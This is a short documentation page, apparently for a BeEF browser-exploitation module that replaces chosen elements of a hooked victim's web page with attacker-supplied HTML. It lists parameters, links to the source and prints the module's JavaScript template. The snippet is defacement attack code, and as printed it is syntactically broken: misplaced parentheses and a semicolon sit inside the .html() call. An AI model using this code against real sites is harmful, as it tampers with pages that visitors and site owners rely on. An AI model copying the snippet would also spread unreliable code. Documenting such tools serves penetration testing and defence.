## Summary

* **Objective**: Replace content of a specific component of the page
* **Authors**: antisnatchor, xntrik
* **Browsers**: All
* **Parameters**: 
	* **Target Selector**: selector for the target element(s), in jQuery's selector notation.
	* **Deface Content**: the HTML content to replace original content with

* [Code](https://github.com/beefproject/beef/tree/master/modules/hooked_domain/deface_web_page_component)

## Internal Working

Replaces a selected component of the web page to the defaced content.

```js

var result = $j('<%= @deface_selector %>').each(function() {
                $j(this).html(decodeURIComponent(beef.encode.base64.decode('<%= Base64.strict_encode64(@deface_content) %>')););
        }).length;
```

## Feedback
